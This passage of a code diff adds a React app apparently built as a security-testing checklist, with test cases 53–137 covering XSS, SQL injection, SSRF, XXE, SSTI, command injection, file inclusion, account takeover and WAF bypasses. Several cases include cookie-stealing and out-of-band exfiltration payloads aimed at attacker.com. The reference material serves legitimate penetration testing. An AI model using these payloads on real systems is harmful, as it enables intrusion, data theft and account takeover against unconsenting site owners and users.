+                        bugType: ["crlf-injection", "cache-poisoning"],
+                        sections: {
+                            "Example": "```\nGET /%0d%0aX-Forwarded-Host:hacker.com HTTP/1.1\nHost: target.com\n```"
+                        }
+                    }, {
+                        id: 54,
+                        title: "CRLF Injection - Log Injection",
+                        bugType: ["crlf-injection", "log-injection"],
+                        sections: {
+                            "Example": "```\n/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit\n```"
+                        }
+                    }, {
+                        id: 55,
+                        title: "CRLF Injection - Header Injection",
+                        bugType: ["crlf-injection", "header-injection"],
+                        sections: {
+                            "Example": "```\nwww.target.com/%0d%0aHackersHeader\\:NewHeader\n```"
+                        }
+                    }]
+                },
+                "Open Redirect": {
+                    description: "Test cases for open redirect vulnerabilities including parameter testing, URL manipulation, and login flow redirects.",
+                    testCases: [{
+                        id: 56,
+                        title: "Open Redirect - Parameter Testing",
+                        bugType: ["open-redirect", "parameter-manipulation"],
+                        sections: {
+                            "Parameter Names": "`dest, uri, continue, window, View, show, open, redirect, Path, url, out, to, Dir, navigation, file, reference, Html, data, site, host, Page, port, next, feed, Return, callback, val, doman, Return_url, validate, returnurl, return_to, Currurl, relaystate, successuri, exit_uri`"
+                        }
+                    }, {
+                        id: 57,
+                        title: "Open Redirect - URL Parameters",
+                        bugType: ["open-redirect", "url-manipulation"],
+                        sections: {
+                            "Examples": "```\n?url=http\\://{target}\n?url=//{target}\n?url=$2f%2f{target}\n?url=/{target}\n?redirect={target}\n?next={target}\n?destination={payload}\n?returnTo={payload}\n```"
+                        }
+                    }, {
+                        id: 58,
+                        title: "Open Redirect - Login Flow",
+                        bugType: ["open-redirect", "login-flow"],
+                        sections: {
+                            "Steps": "1. Go to profile page: `samplesite.me/accounts/profile`\n2. Logout and clear cookies\n3. Paste profile URL\n4. Check redirect parameters:\n- `https://samplesite.me/login?next=accounts/profile`\n- `https://samplesite.me/login?retUrl=accounts/profile`\n5. Exploit: `https://samplesite.me/login?next=https://evil.com/`"
+                        }
+                    }, {
+                        id: 59,
+                        title: "Open Redirect - XSS Chaining",
+                        bugType: ["open-redirect", "xss-chain"],
+                        sections: {
+                            "Example": "```\nhttps://samplesite.me/login?next=javascript\\:alert(1);//\n```"
+                        }
+                    }, {
+                        id: 60,
+                        title: "Open Redirect - Google Dorking",
+                        bugType: ["open-redirect", "discovery"],
+                        sections: {
+                            "Dork": "```\nsite:target.com inurl:?dest inurl\\:uri | inurl\\:continue | inurl\\:window | inurl\\:View | inurl\\:show | inurl\\:open | inurl\\:redirect | inurl\\:Path | inurl\\:url | inurl\\:out | inurl\\:to | inurl\\:Dir | inurl\\:navigation | inurl\\:file | inurl\\:reference | inurl\\:Html | inurl\\:data | inurl\\:site | inurl\\:host\n```"
+                        }
+                    }]
+                },
+                "403 Bypass": {
+                    description: "Test cases for bypassing 403 forbidden responses using header injection, path traversal, and cache poisoning.",
+                    testCases: [{
+                        id: 61,
+                        title: "X-Original-URL Header",
+                        bugType: ["403-bypass", "header-injection"],
+                        sections: {
+                            "Example": "```\nGET /anything HTTP/1.1\nHost: target.com\nX-Original-URL: /admin\n```"
+                        }
+                    }, {
+                        id: 62,
+                        title: "Path Traversal Bypass",
+                        bugType: ["403-bypass", "path-manipulation"],
+                        sections: {
+                            "Examples": "```\ntarget.com/%2e%2e/admin\ntarget.com/secret/.\ntarget.com//secret//\ntarget.com/./secret/..\ntarget.com/;/secret\ntarget.com/.;/secret\ntarget.com//;//secret\n```"
+                        }
+                    }, {
+                        id: 63,
+                        title: "Directory Name Manipulation",
+                        bugType: ["403-bypass", "directory-manipulation"],
+                        sections: {
+                            "Examples": "```\ntarget.com/admin..;/\ntarget.com/aDmIN\n```"
+                        }
+                    }, {
+                        id: 64,
+                        title: "Web Cache Poisoning",
+                        bugType: ["403-bypass", "cache-poisoning"],
+                        sections: {
+                            "Example": "```\nGET /anything HTTP/1.1\nHost: victim.com\nX-Original-URL: /admin\n```"
+                        }
+                    }]
+                },
+                "SSRF (Server-Side Request Forgery)": {
+                    description: "Test cases for SSRF vulnerabilities including URL parameter manipulation and encoding bypass techniques.",
+                    testCases: [{
+                        id: 65,
+                        title: "URL Parameter Manipulation",
+                        bugType: ["ssrf", "url-manipulation"],
+                        sections: {
+                            "Steps": "1. Find parameters that take URLs\n2. Test with internal IP addresses:\n- `http://127.0.0.1`\n- `http://169.254.169.254` (AWS metadata)\n- `http://localhost`\n3. Check response for internal data"
+                        }
+                    }, {
+                        id: 66,
+                        title: "SSRF via URL Encoding",
+                        bugType: ["ssrf", "encoding-bypass"],
+                        sections: {
+                            "Examples": "```\nhttp://2130706433/ (127.0.0.1)\nhttp://0x7F000001/\nhttp://0177.0.0.1/\n```"
+                        }
+                    }]
+                },
+                "Business Logic Flaws": {
+                    description: "Test cases for business logic flaws including race conditions, parameter pollution, and parameter fragmentation.",
+                    testCases: [{
+                        id: 67,
+                        title: "Race Condition - Discount Code",
+                        bugType: ["business-logic", "race-condition"],
+                        sections: {
+                            "Steps": "1. Add item to cart\n2. Apply discount code\n3. Send multiple coupon requests in parallel\n4. Check if discount is applied multiple times\n5. Purchase item at reduced price"
+                        }
+                    }, {
+                        id: 68,
+                        title: "Parameter Pollution",
+                        bugType: ["business-logic", "hpp"],
+                        sections: {
+                            "Testing": "```\n/?id=1;select+1&id=2,3+from+users+where+id=1--\n/?id=1/**/union/*&id=*/select/*&id=*/pwd/*&id=*/from/*&id=*/users\n```"
+                        }
+                    }, {
+                        id: 69,
+                        title: "Parameter Fragmentation",
+                        bugType: ["business-logic", "hpf"],
+                        sections: {
+                            "Example": "```\n/?a=1+union/*&b=*/select+1,2\n/?a=1+union/*&b=*/select+1,pass/*&c=*/from+users--\n```"
+                        }
+                    }]
+                },
+                "WAF Bypass": {
+                    description: "Test cases for WAF bypass techniques including SQL injection normalization, HPP bypass, and signature bypass.",
+                    testCases: [{
+                        id: 70,
+                        title: "SQL Injection - Normalization Bypass",
+                        bugType: ["waf-bypass", "sql-injection"],
+                        sections: {
+                            "Examples": "```\n/?id=1/*union*/union/*select*/select+1,2,3/*\n/?id=1+un/**/ion+sel/**/ect+1,2,3--\n```"
+                        }
+                    }, {
+                        id: 71,
+                        title: "SQL Injection - HPP Bypass",
+                        bugType: ["waf-bypass", "sql-hpp"],
+                        sections: {
+                            "Example": "```\n/?id=1;select+1&id=2,3+from+users+where+id=1--\n```"
+                        }
+                    }, {
+                        id: 72,
+                        title: "SQL Injection - Blind SQL",
+                        bugType: ["waf-bypass", "blind-sql"],
+                        sections: {
+                            "Function Synonyms": "- `substring()` → `mid()`, `substr()`\n- `ascii()` → `hex()`, `bin()`\n- `benchmark()` → `sleep()`",
+                            "Logical Operators": "- `and 1=1`\n- `and 5!=6`\n- `and 0x50=0x50`"
+                        }
+                    }, {
+                        id: 73,
+                        title: "SQL Injection - Signature Bypass",
+                        bugType: ["waf-bypass", "signature-bypass"],
+                        sections: {
+                            "Examples": "```\n/?id=1+union+(select+'xz'from+xxx)\n/?id=(1)union(select(1),mid(hash,1,32)from(users))\n/?id=(1)or(0x50=0x50)\n```"
+                        }
+                    }, {
+                        id: 74,
+                        title: "XSS - WAF Bypass",
+                        bugType: ["waf-bypass", "xss"],
+                        sections: {
+                            "Examples": "```\n<svg onload=prompt%26%230000000040document.domain)>\n<svg onload=prompt%26%23x000000028;document.domain)>\n<img src=x onerror=alert%26%23040;1%26%23041;>\n```"
+                        }
+                    }, {
+                        id: 75,
+                        title: "XSS - Data URI",
+                        bugType: ["waf-bypass", "xss-datauri"],
+                        sections: {
+                            "Example": "```\n/?param=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\n```"
+                        }
+                    }]
+                },
+                "S3 Bucket Misconfiguration": {
+                    description: "Test cases for S3 bucket misconfigurations including public listing, write access, and delete access.",
+                    testCases: [{
+                        id: 76,
+                        title: "S3 Bucket - List Items",
+                        bugType: ["s3-misconfig", "public-bucket"],
+                        sections: {
+                            "Commands": "```bash\naws s3 ls s3://<bucket name>\naws s3 ls s3://<bucket name> --no-sign-request\n```"
+                        }
+                    }, {
+                        id: 77,
+                        title: "S3 Bucket - Write Access",
+                        bugType: ["s3-misconfig", "write-access"],
+                        sections: {
+                            "Commands": "```bash\naws s3 mv test.txt s3://<bucket name>\naws s3 cp test.txt s3://[bucketname]/test.txt\n```"
+                        }
+                    }, {
+                        id: 78,
+                        title: "S3 Bucket - Delete Access",
+                        bugType: ["s3-misconfig", "delete-access"],
+                        sections: {
+                            "Command": "```bash\naws s3 rm test.txt s3://<bucket name>/test.txt\n```"
+                        }
+                    }]
+                },
+                "XSS (Cross-Site Scripting)": {
+                    description: "Test cases for XSS vulnerabilities including reflected, stored, DOM-based, and various injection contexts.",
+                    testCases: [{
+                        id: 79,
+                        title: "Reflected XSS - Basic",
+                        bugType: ["xss", "reflected"],
+                        sections: {
+                            "Examples": "```\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n```"
+                        }
+                    }, {
+                        id: 80,
+                        title: "Reflected XSS - HTML Context",
+                        bugType: ["xss", "reflected-html"],
+                        sections: {
+                            "Examples": "```\n\"><script>alert(document.domain)</script>\n\" onmouseover=\"alert('XSS')\n\" accesskey=\"X\" onclick=\"alert(1)\n```"
+                        }
+                    }, {
+                        id: 81,
+                        title: "Reflected XSS - URL Path",
+                        bugType: ["xss", "reflected-url"],
+                        sections: {
+                            "Examples": "```\nhttps://target.com/%22%3E%3Cscript%3Ealert(1)%3C/script%3E\nhttps://target.com/search?q=<script>alert(1)</script>\n```"
+                        }
+                    }, {
+                        id: 82,
+                        title: "Stored XSS - Comments",
+                        bugType: ["xss", "stored"],
+                        sections: {
+                            "Example": "```\n</textarea><img src=x onerror=alert(1)>\n```"
+                        }
+                    }, {
+                        id: 83,
+                        title: "Stored XSS - Profile Fields",
+                        bugType: ["xss", "stored-profile"],
+                        sections: {
+                            "Example": "```\n\"><svg/onload=alert(document.domain)>\n```"
+                        }
+                    }, {
+                        id: 84,
+                        title: "XSS via Markdown",
+                        bugType: ["xss", "markdown"],
+                        sections: {
+                            "Examples": "```\n[Click](javascript:alert(1))\n![image](javascript:alert(1))\n```"
+                        }
+                    }, {
+                        id: 85,
+                        title: "XSS via File Upload",
+                        bugType: ["xss", "file-upload"],
+                        sections: {
+                            "Examples": "- Upload HTML file with XSS\n- Upload SVG with XSS\n- Upload image with XSS in filename"
+                        }
+                    }, {
+                        id: 86,
+                        title: "DOM-Based XSS",
+                        bugType: ["xss", "dom-based"],
+                        sections: {
+                            "Steps": "1. Look for JavaScript that uses:\n- `document.location`\n- `document.URL`\n- `location.hash`\n- `document.referrer`\n2. Test with payload"
+                        }
+                    }, {
+                        id: 87,
+                        title: "XSS via Cookie Theft",
+                        bugType: ["xss", "cookie-theft"],
+                        sections: {
+                            "Payload": "```javascript\n<script>document.location='//attacker.com/'+document.cookie</script>\n```"
+                        }
+                    }, {
+                        id: 88,
+                        title: "XSS via Password Reset",
+                        bugType: ["xss", "password-reset"],
+                        sections: {
+                            "Example": "```\nSet password as: >'>\"><img src=x onmouseover=prompt(document.domain)>\n```"
+                        }
+                    }, {
+                        id: 89,
+                        title: "XSS via CSS Injection",
+                        bugType: ["xss", "css-injection"],
+                        sections: {
+                            "Example": "```\n<style>@import '//attacker.com/evil.css';</style>\n```"
+                        }
+                    }, {
+                        id: 90,
+                        title: "XSS via META Tag",
+                        bugType: ["xss", "meta-tag"],
+                        sections: {
+                            "Example": "```\n<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">\n```"
+                        }
+                    }]
+                },
+                "SQL Injection": {
+                    description: "Test cases for SQL injection vulnerabilities including error-based, union-based, blind, and out-of-band techniques.",
+                    testCases: [{
+                        id: 91,
+                        title: "SQL Injection - Error Based",
+                        bugType: ["sql-injection", "error-based"],
+                        sections: {
+                            "Examples": "```\n' OR '1'='1\n' UNION SELECT 1,2,3--\n' AND 1=1--\n```"
+                        }
+                    }, {
+                        id: 92,
+                        title: "SQL Injection - Union Based",
+                        bugType: ["sql-injection", "union-based"],
+                        sections: {
+                            "Examples": "```\n1 UNION SELECT 1,2,3\n1 UNION SELECT user,password FROM users\n```"
+                        }
+                    }, {
+                        id: 93,
+                        title: "SQL Injection - Blind Boolean",
+                        bugType: ["sql-injection", "blind-boolean"],
+                        sections: {
+                            "Examples": "```\n' AND 1=1--\n' AND 'a'='a\n' AND 5!=6\n```"
+                        }
+                    }, {
+                        id: 94,
+                        title: "SQL Injection - Blind Time",
+                        bugType: ["sql-injection", "blind-time"],
+                        sections: {
+                            "Examples": "```\n' AND SLEEP(5)--\n' AND BENCHMARK(2000000,MD5(NOW()))--\n```"
+                        }
+                    }, {
+                        id: 95,
+                        title: "SQL Injection - Out-of-Band",
+                        bugType: ["sql-injection", "oob"],
+                        sections: {
+                            "Example": "```\n1 AND LOAD_FILE(CONCAT('\\\\\\\\',DATABASE(),'.attacker.com\\\\test'))\n```"
+                        }
+                    }]
+                },
+                "Command Injection": {
+                    description: "Test cases for command injection vulnerabilities including basic injection and bypass techniques.",
+                    testCases: [{
+                        id: 96,
+                        title: "Command Injection - Basic",
+                        bugType: ["cmd-injection", "basic"],
+                        sections: {
+                            "Examples": "```\n; ls -la\n| whoami\n& id\n`id`\n```"
+                        }
+                    }, {
+                        id: 97,
+                        title: "Command Injection - Bypass",
+                        bugType: ["cmd-injection", "bypass"],
+                        sections: {
+                            "Examples": "```\n$(id)\n${IFS}id\n;cat${IFS}/etc/passwd\n```"
+                        }
+                    }]
+                },
+                "File Inclusion": {
+                    description: "Test cases for file inclusion vulnerabilities including LFI, RFI, null byte, and log poisoning.",
+                    testCases: [{
+                        id: 98,
+                        title: "Local File Inclusion (LFI)",
+                        bugType: ["lfi", "path-traversal"],
+                        sections: {
+                            "Examples": "```\n../../../../etc/passwd\n..\\..\\..\\windows\\win.ini\n/../../../../../../../etc/passwd\n```"
+                        }
+                    }, {
+                        id: 99,
+                        title: "LFI - Null Byte",
+                        bugType: ["lfi", "null-byte"],
+                        sections: {
+                            "Example": "```\n../../../../etc/passwd%00\n```"
+                        }
+                    }, {
+                        id: 100,
+                        title: "LFI - Log Poisoning",
+                        bugType: ["lfi", "log-poisoning"],
+                        sections: {
+                            "Steps": "1. Poison logs with PHP code\n2. Include log file\n3. Execute code"
+                        }
+                    }, {
+                        id: 101,
+                        title: "Remote File Inclusion (RFI)",
+                        bugType: ["rfi", "remote-include"],
+                        sections: {
+                            "Examples": "```\nhttp://attacker.com/shell.txt\ndata:text/plain,<?php phpinfo(); ?>\n```"
+                        }
+                    }]
+                },
+                "Account Takeover": {
+                    description: "Test cases for account takeover vulnerabilities including link poisoning, CSRF email change, and OTP reuse.",
+                    testCases: [{
+                        id: 102,
+                        title: "Account Takeover - Link Poisoning",
+                        bugType: ["account-takeover", "link-poisoning"],
+                        sections: {
+                            "Example": "```\nYOUR ACCOUNT<a href=\"https://evil.com\">LOGIN</a>\n```"
+                        }
+                    }, {
+                        id: 103,
+                        title: "Account Takeover - CSRF Email Change",
+                        bugType: ["account-takeover", "csrf-email"],
+                        sections: {
+                            "Steps": "1. Create CSRF POC for email change\n2. Send to victim\n3. Victim's email gets changed\n4. Reset password to takeover"
+                        }
+                    }, {
+                        id: 104,
+                        title: "Account Takeover - Password Reset Link Theft",
+                        bugType: ["account-takeover", "token-theft"],
+                        sections: {
+                            "Steps": "1. Request password reset\n2. Intercept and change host header\n3. Token sent to attacker's server\n4. Use token to takeover account"
+                        }
+                    }, {
+                        id: 105,
+                        title: "Account Takeover - OTP Reuse",
+                        bugType: ["account-takeover", "otp-reuse"],
+                        sections: {
+                            "Steps": "1. Get OTP for your account\n2. Use same OTP for victim's account\n3. If OTP is not tied to session → vulnerable"
+                        }
+                    }]
+                },
+                "Clickjacking": {
+                    description: "Test cases for clickjacking vulnerabilities including missing X-Frame-Options and 2FA disable attacks.",
+                    testCases: [{
+                        id: 106,
+                        title: "Clickjacking - Basic",
+                        bugType: ["clickjacking", "missing-x-frame-options"],
+                        sections: {
+                            "Steps": "1. Check if X-Frame-Options header is missing\n2. Create page with iframe\n3. Overlay buttons to trick victim"
+                        }
+                    }, {
+                        id: 107,
+                        title: "Clickjacking - 2FA Disable",
+                        bugType: ["clickjacking", "2fa-disable"],
+                        sections: {
+                            "Steps": "1. Find 2FA disable page\n2. Check if vulnerable to Clickjacking\n3. Overlay on victim's page\n4. Victim clicks and disables 2FA"
+                        }
+                    }]
+                },
+                "Race Condition": {
+                    description: "Test cases for race condition vulnerabilities including account creation, coupon application, and balance transfer.",
+                    testCases: [{
+                        id: 108,
+                        title: "Race Condition - Account Creation",
+                        bugType: ["race-condition", "account-creation"],
+                        sections: {
+                            "Steps": "1. Send multiple account creation requests\n2. Check for duplicate accounts\n3. Try to use same email multiple times"
+                        }
+                    }, {
+                        id: 109,
+                        title: "Race Condition - Coupon Application",
+                        bugType: ["race-condition", "coupon"],
+                        sections: {
+                            "Steps": "1. Apply coupon\n2. Send multiple requests in parallel\n3. Check if coupon applied multiple times"
+                        }
+                    }, {
+                        id: 110,
+                        title: "Race Condition - Balance Transfer",
+                        bugType: ["race-condition", "balance-transfer"],
+                        sections: {
+                            "Steps": "1. Send balance transfer requests in parallel\n2. Check if balance is transferred multiple times"
+                        }
+                    }]
+                },
+                "Information Disclosure": {
+                    description: "Test cases for information disclosure vulnerabilities including error messages, source code, and directory listing.",
+                    testCases: [{
+                        id: 111,
+                        title: "Information Disclosure - Error Messages",
+                        bugType: ["info-disclosure", "error-messages"],
+                        sections: {
+                            "Steps": "1. Trigger errors\n2. Check for sensitive information\n3. Stack traces, DB errors, file paths"
+                        }
+                    }, {
+                        id: 112,
+                        title: "Information Disclosure - Source Code",
+                        bugType: ["info-disclosure", "source-code"],
+                        sections: {
+                            "Steps": "1. Check for .git, .svn, .env files\n2. Check for backup files (.bak, .swp)\n3. Check for .htaccess, .htpasswd"
+                        }
+                    }, {
+                        id: 113,
+                        title: "Information Disclosure - Directory Listing",
+                        bugType: ["info-disclosure", "directory-listing"],
+                        sections: {
+                            "Steps": "1. Check if directory listing is enabled\n2. Access sensitive directories"
+                        }
+                    }]
+                },
+                "Weak Password Policy": {
+                    description: "Test cases for weak password policies including no length restriction, common passwords, and no complexity.",
+                    testCases: [{
+                        id: 114,
+                        title: "No Password Length Restriction",
+                        bugType: ["weak-password", "no-length-limit"],
+                        sections: {
+                            "Steps": "1. Register with extremely long password (1000+ chars)\n2. Check if accepted\n3. Check response time"
+                        }
+                    }, {
+                        id: 115,
+                        title: "Common Passwords Allowed",
+                        bugType: ["weak-password", "common-passwords"],
+                        sections: {
+                            "Testing": "- `password`\n- `123456`\n- `admin`\n- `qwerty`"
+                        }
+                    }, {
+                        id: 116,
+                        title: "No Password Complexity",
+                        bugType: ["weak-password", "no-complexity"],
+                        sections: {
+                            "Testing": "- Lowercase only\n- No special characters\n- No numbers"
+                        }
+                    }]
+                },
+                "Insecure Direct Object Reference (IDOR)": {
+                    description: "Test cases for IDOR vulnerabilities including profile access, file access, and password reset.",
+                    testCases: [{
+                        id: 117,
+                        title: "IDOR - Profile Access",
+                        bugType: ["idor", "profile-access"],
+                        sections: {
+                            "Steps": "1. Access profile with numeric ID\n2. Change ID to other users\n3. Access other profiles"
+                        }
+                    }, {
+                        id: 118,
+                        title: "IDOR - File Access",
+                        bugType: ["idor", "file-access"],
+                        sections: {
+                            "Steps": "1. Access file with numeric ID\n2. Change ID\n3. Access other users' files"
+                        }
+                    }, {
+                        id: 119,
+                        title: "IDOR - Password Reset",
+                        bugType: ["idor", "password-reset"],
+                        sections: {
+                            "Steps": "1. Request password reset\n2. Intercept request\n3. Change user ID/email\n4. Reset other user's password"
+                        }
+                    }]
+                },
+                "Mass Assignment": {
+                    description: "Test cases for mass assignment vulnerabilities including user role and email verification.",
+                    testCases: [{
+                        id: 120,
+                        title: "Mass Assignment - User Role",
+                        bugType: ["mass-assignment", "role"],
+                        sections: {
+                            "Steps": "1. Create account\n2. Intercept request\n3. Add `role=admin`\n4. Check if role is assigned"
+                        }
+                    }, {
+                        id: 121,
+                        title: "Mass Assignment - Email Verification",
+                        bugType: ["mass-assignment", "verified"],
+                        sections: {
+                            "Steps": "1. Create account\n2. Intercept request\n3. Add `verified=true`\n4. Check if email is verified"
+                        }
+                    }]
+                },
+                "Security Misconfiguration": {
+                    description: "Test cases for security misconfigurations including missing headers, default credentials, and HTTP methods.",
+                    testCases: [{
+                        id: 122,
+                        title: "Missing Security Headers",
+                        bugType: ["sec-misconfig", "missing-headers"],
+                        sections: {
+                            "Check for": "- `X-Frame-Options`\n- `X-XSS-Protection`\n- `Content-Security-Policy`\n- `Strict-Transport-Security`"
+                        }
+                    }, {
+                        id: 123,
+                        title: "Default Credentials",
+                        bugType: ["sec-misconfig", "default-creds"],
+                        sections: {
+                            "Check for": "- `admin/admin`\n- `admin/password`\n- `root/root`"
+                        }
+                    }, {
+                        id: 124,
+                        title: "HTTP Methods Enabled",
+                        bugType: ["sec-misconfig", "http-methods"],
+                        sections: {
+                            "Testing": "```\nOPTIONS / HTTP/1.1\nHost: target.com\n```",
+                            "Check for": "- `PUT`\n- `DELETE`\n- `TRACE`\n- `CONNECT`"
+                        }
+                    }]
+                },
+                "SSL/TLS Issues": {
+                    description: "Test cases for SSL/TLS issues including mixed content and weak ciphers.",
+                    testCases: [{
+                        id: 125,
+                        title: "Mixed Content",
+                        bugType: ["ssl-tls", "mixed-content"],
+                        sections: {
+                            "Steps": "1. Check if HTTPS page loads HTTP resources\n2. Scripts, images, CSS over HTTP"
+                        }
+                    }, {
+                        id: 126,
+                        title: "Weak SSL/TLS Ciphers",
+                        bugType: ["ssl-tls", "weak-ciphers"],
+                        sections: {
+                            "Testing": "```\nopenssl s_client -connect target.com:443 -cipher 'LOW:EXP:DES:RC4'\n```"
+                        }
+                    }]
+                },
+                "Session Fixation": {
+                    description: "Test cases for session fixation vulnerabilities including URL and cookie based attacks.",
+                    testCases: [{
+                        id: 127,
+                        title: "Session Fixation - URL",
+                        bugType: ["session-fixation", "url"],
+                        sections: {
+                            "Steps": "1. Get session ID\n2. Force victim to use that session ID\n3. Login as victim"
+                        }
+                    }, {
+                        id: 128,
+                        title: "Session Fixation - Cookie",
+                        bugType: ["session-fixation", "cookie"],
+                        sections: {
+                            "Steps": "1. Set session cookie\n2. Force victim's browser to use it\n3. Login as victim"
+                        }
+                    }]
+                },
+                "Insecure File Upload": {
+                    description: "Test cases for insecure file upload vulnerabilities including unrestricted uploads and bypass techniques.",
+                    testCases: [{
+                        id: 129,
+                        title: "File Upload - Unrestricted",
+                        bugType: ["file-upload", "unrestricted"],
+                        sections: {
+                            "Steps": "1. Upload PHP, JSP, ASP files\n2. Check if executed on server\n3. Access uploaded file"
+                        }
+                    }, {
+                        id: 130,
+                        title: "File Upload - Content-Type Bypass",
+                        bugType: ["file-upload", "content-type-bypass"],
+                        sections: {
+                            "Steps": "1. Upload PHP file with image content-type\n2. Check if bypass works\n3. Execute uploaded file"
+                        }
+                    }, {
+                        id: 131,
+                        title: "File Upload - Extension Bypass",
+                        bugType: ["file-upload", "extension-bypass"],
+                        sections: {
+                            "Examples": "- `shell.php.jpg`\n- `shell.php%00.jpg`\n- `shell.php;.jpg`"
+                        }
+                    }]
+                },
+                "XML Injection/XXE": {
+                    description: "Test cases for XML injection and XXE vulnerabilities including basic and out-of-band attacks.",
+                    testCases: [{
+                        id: 132,
+                        title: "XXE - Basic",
+                        bugType: ["xxe", "basic"],
+                        sections: {
+                            "Payload": "```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]>\n<root>&test;</root>\n```"
+                        }
+                    }, {
+                        id: 133,
+                        title: "XXE - Out-of-Band",
+                        bugType: ["xxe", "oob"],
+                        sections: {
+                            "Payload": "```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY % payload SYSTEM \"http://attacker.com/evil.dtd\">%payload;]>\n```"
+                        }
+                    }]
+                },
+                "LDAP Injection": {
+                    description: "Test cases for LDAP injection vulnerabilities.",
+                    testCases: [{
+                        id: 134,
+                        title: "LDAP Injection - Basic",
+                        bugType: ["ldap-injection", "basic"],
+                        sections: {
+                            "Examples": "```\n*)(&\n*)(uid=*\nadmin)(&)\n```"
+                        }
+                    }]
+                },
+                "NoSQL Injection": {
+                    description: "Test cases for NoSQL injection vulnerabilities including MongoDB operators.",
+                    testCases: [{
+                        id: 135,
+                        title: "NoSQL Injection - MongoDB",
+                        bugType: ["nosql-injection", "mongodb"],
+                        sections: {
+                            "Examples": "```\n{$gt: ''}\n{$ne: null}\n$or: [{}, {}]\n```",
+                            "Testing": "```\nusername[$ne]=null&password[$ne]=null\n```"
+                        }
+                    }]
+                },
+                "SSTI (Server-Side Template Injection)": {
+                    description: "Test cases for SSTI vulnerabilities including basic injection and RCE.",
+                    testCases: [{
+                        id: 136,
+                        title: "SSTI - Basic",
+                        bugType: ["ssti", "basic"],
+                        sections: {
+                            "Examples": "```\n{{7*7}}\n${7*7}\n<%=7*7%>\n${{7*7}}\n#{7*7}\n{{ '7'*7 }}\n{{{{7*7}}}}\n```"
+                        }
+                    }, {
+                        id: 137,
+                        title: "SSTI - RCE",
+                        bugType: ["ssti", "rce"],
+                        sections: {
+                            "Examples": "```\n{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}\n{{ config.items() }}\n{{ self.__class__.__mro__[1].__subclasses__() }}\n```"
+                        }
+                    }]
+                }
+            }
+        };
+
+        // Compute total test cases
+        let totalTestCases = 0;
+        let totalCategories = 0;
+        let totalPayloads = 0;
+        let totalSteps = 0;
+
+        for (const cat in TEST_DATA.categories) {
+            const tc = TEST_DATA.categories[cat].testCases;
+            totalTestCases += tc.length;
+            totalCategories++;
+            for (const t of tc) {
+                if (t.sections) {
+                    for (const key in t.sections) {
+                        const val = t.sections[key];
+                        if (typeof val === 'string') {
+                            if (key.toLowerCase().includes('payload') || key.toLowerCase().includes('example') || key
+                                .toLowerCase().includes('dork')) {
+                                totalPayloads++;
+                            }
+                            if (key.toLowerCase().includes('step')) {
+                                totalSteps++;
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        // Helper: get category for a test case
+        function getCategoryForTest(testId) {
+            for (const cat in TEST_DATA.categories) {
+                for (const tc of TEST_DATA.categories[cat].testCases) {
+                    if (tc.id === testId) return cat;
+                }
+            }
+            return null;
+        }
+
+        // Helper: get test case by id
+        function getTestById(id) {
+            for (const cat in TEST_DATA.categories) {
+                for (const tc of TEST_DATA.categories[cat].testCases) {
+                    if (tc.id === id) return tc;
+                }
+            }
+            return null;
+        }
+
+        // Helper: get all test cases as flat array
+        function getAllTestCases() {
+            const result = [];
+            for (const cat in TEST_DATA.categories) {
+                for (const tc of TEST_DATA.categories[cat].testCases) {
+                    result.push({ ...tc, category: cat });
+                }
+            }
+            return result;
+        }
+
+        // Helper: get category data
+        function getCategoryData(name) {
+            return TEST_DATA.categories[name] || null;
+        }
+
+        // Helper: get all category names
+        function getCategoryNames() {
+            return Object.keys(TEST_DATA.categories);
+        }
+
+        // Helper: get all bug types
+        function getAllBugTypes() {
+            const set = new Set();
+            for (const cat in TEST_DATA.categories) {
+                for (const tc of TEST_DATA.categories[cat].testCases) {
+                    for (const bt of tc.bugType) {
+                        set.add(bt);
+                    }
+                }
+            }
+            return Array.from(set).sort();
+        }
+
+        // ============================================================
+        // REACT APP
+        // ============================================================
+        const { useState, useEffect, useRef, useCallback, useMemo, createContext, useContext } = React;
+
+        // --- Context ---
+        const AppContext = createContext();
+
+        const AppProvider = ({ children }) => {
+            const [currentView, setCurrentView] = useState('home'); // 'home' | 'category' | 'test'
+            const [selectedCategory, setSelectedCategory] = useState(null);
+            const [selectedTestId, setSelectedTestId] = useState(null);
+            const [searchQuery, setSearchQuery] = useState('');
+            const [filters, setFilters] = useState({ category: '', bugType: '', testNumber: '' });
+            const [bookmarks, setBookmarks] = useState(() => {
+                try {
+                    const saved = localStorage.getItem('sectest_bookmarks');
+                    return saved ? JSON.parse(saved) : [];
+                } catch { return []; }
+            });
+            const [sidebarOpen, setSidebarOpen] = useState(false);
+
+            useEffect(() => {
+                localStorage.setItem('sectest_bookmarks', JSON.stringify(bookmarks));
+            }, [bookmarks]);
+
+            const toggleBookmark = (testId) => {
+                setBookmarks(prev =>
+                    prev.includes(testId) ? prev.filter(id => id !== testId) : [...prev, testId]
+                );
+            };
+
+            const isBookmarked = (testId) => bookmarks.includes(testId);
+
+            const navigateToHome = () => {
+                setCurrentView('home');
+                setSelectedCategory(null);
+                setSelectedTestId(null);
+                setSidebarOpen(false);
+            };
+
+            const navigateToCategory = (category) => {
+                setSelectedCategory(category);
+                setCurrentView('category');
+                setSelectedTestId(null);
+                setSidebarOpen(false);
+            };
+
+            const navigateToTest = (testId) => {
+                const tc = getTestById(testId);
+                if (tc) {
+                    const cat = getCategoryForTest(testId);
+                    setSelectedCategory(cat);
+                    setSelectedTestId(testId);
+                    setCurrentView('test');
+                    setSidebarOpen(false);
+                }
+            };
+
+            const value = {
+                currentView,
+                setCurrentView,
+                selectedCategory,
+                setSelectedCategory,
+                selectedTestId,
+                setSelectedTestId,
+                searchQuery,
+                setSearchQuery,
+                filters,
+                setFilters,
+                bookmarks,
+                toggleBookmark,
+                isBookmarked,
+                navigateToHome,
+                navigateToCategory,
+                navigateToTest,
+                sidebarOpen,
+                setSidebarOpen,
+            };
+
+            return React.createElement(AppContext.Provider, { value }, children);
+        };
+
+        const useApp = () => useContext(AppContext);
+
+        // --- Components ---
+
+        const Icon = ({ name, size = 18, className = '', ...props }) => {
